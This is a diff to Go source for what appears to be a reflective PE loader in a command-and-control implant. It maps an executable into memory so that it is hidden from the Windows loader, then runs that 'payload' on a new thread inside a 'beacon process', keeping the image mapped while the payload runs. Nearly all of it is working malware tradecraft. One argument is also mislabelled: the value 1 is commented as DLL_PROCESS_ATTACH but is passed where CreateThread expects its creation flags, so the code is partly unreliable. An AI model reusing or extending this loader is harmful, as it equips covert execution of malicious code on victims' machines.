@@ -546,10 +546,6 @@ func peFinalizeSections(img *peImage) {
 // not registered with the LDR and is not discoverable by a
 // later LoadLibrary call.
 func ExecutePEInProcess(raw []byte, waitMs int) (string, int, error) {
-	// Keep the OS thread locked for the duration of the map and
-	// the entry-thread wait; Go's stack may move otherwise, and
-	// a native thread that expects the loader thread to stay
-	// put will crash.
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
@@ -560,9 +556,12 @@ func ExecutePEInProcess(raw []byte, waitMs int) (string, int, error) {
 	if err := peMap(img); err != nil {
 		return "", -1, err
 	}
-	// Free the mapping if anything below fails.
+
+	keepMapping := false
 	defer func() {
-		peVirtualFree.Call(img.imageBase, 0, uintptr(peMemRelease))
+		if !keepMapping {
+			peVirtualFree.Call(img.imageBase, 0, uintptr(peMemRelease))
+		}
 	}()
 
 	if err := peProcessImports(img); err != nil {
@@ -578,14 +577,38 @@ func ExecutePEInProcess(raw []byte, waitMs int) (string, int, error) {
 
 	entry := peRVA(img.imageBase, img.entryRVA)
 
-	syscall.SyscallN(entry,
-		img.imageBase,
-		1, // DLL_PROCESS_ATTACH
-		1, // lpvReserved non-NULL: dynamically loaded
+	var tid uint32
+	hThread, _, callErr := peCreateThread.Call(
+		0,                             // lpThreadAttributes
+		0,                             // dwStackSize (default)
+		entry,                         // lpStartAddress
+		img.imageBase,                 // lpParameter -> hInstance
+		1,                             // DLL_PROCESS_ATTACH
+		uintptr(unsafe.Pointer(&tid)), // lpThreadId
 	)
+	if hThread == 0 {
+		return "", -1, fmt.Errorf("pe: CreateThread failed: %v", callErr)
+	}
+	defer peCloseHandle.Call(hThread)
+
+	if waitMs > 0 {
+		// WAIT_OBJECT_0 == 0. Any other return (WAIT_TIMEOUT,
+		// WAIT_FAILED) means the payload is still running and we
+		// must leave the image mapped.
+		if r, _, _ := peWaitForSingleObject.Call(
+			hThread, uintptr(waitMs)); uintptr(r) == 0 {
+			peVirtualFree.Call(img.imageBase, 0, uintptr(peMemRelease))
+			keepMapping = true // already freed; defer must not double-free
+		}
+	}
+
+	// The payload owns its own execution from here. If the thread
+	// has not exited (waitMs elapsed, or waitMs == 0), the image
+	// stays mapped for the lifetime of the beacon process.
+	keepMapping = true
 
 	return fmt.Sprintf(
 		"pe: loaded at 0x%x (image size 0x%x, entry RVA 0x%x, thread %d)\n",
-		img.imageBase, img.imageSize, img.entryRVA, threadID,
+		img.imageBase, img.imageSize, img.entryRVA, tid,
 	), 0, nil
 }
